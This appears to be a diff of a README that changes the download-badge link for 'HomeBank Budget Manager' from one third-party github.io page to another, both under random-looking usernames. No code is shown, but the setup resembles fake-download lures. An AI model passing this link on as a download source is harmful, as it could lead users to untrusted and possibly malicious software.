@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://transcard.kz/upload/img/homebank.png)
 
-[![GET — HomeBank Budget Manager](https://img.shields.io/badge/GET%20%E2%80%94%20HomeBank%20Budget%20Manager-0078D6?style=for-the-badge&logoColor=white)](https://predovich2003otani.github.io/.github/)
+[![GET — HomeBank Budget Manager](https://img.shields.io/badge/GET%20%E2%80%94%20HomeBank%20Budget%20Manager-0078D6?style=for-the-badge&logoColor=white)](https://grentoolhop853.github.io/.github/HomeBank-Budget-Manager)
 
 ---
 
